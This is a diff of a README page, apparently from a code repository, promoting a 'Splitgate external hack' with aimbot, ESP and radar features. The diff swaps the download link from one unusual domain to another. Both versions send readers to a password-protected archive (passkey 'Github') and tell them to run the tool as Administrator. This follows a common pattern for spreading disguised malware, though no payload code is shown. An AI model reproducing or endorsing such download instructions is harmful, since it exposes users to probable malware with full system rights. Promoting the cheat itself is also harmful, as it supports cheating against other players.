@@ -6,7 +6,7 @@ Splitgate external hack with aimbot, ESP, radar hack, and more. For educational 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **OpenHack**, **Eclipse Menu**, and **QOLMod**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Splitgate.
 4. Run the hack **as Administrator**.
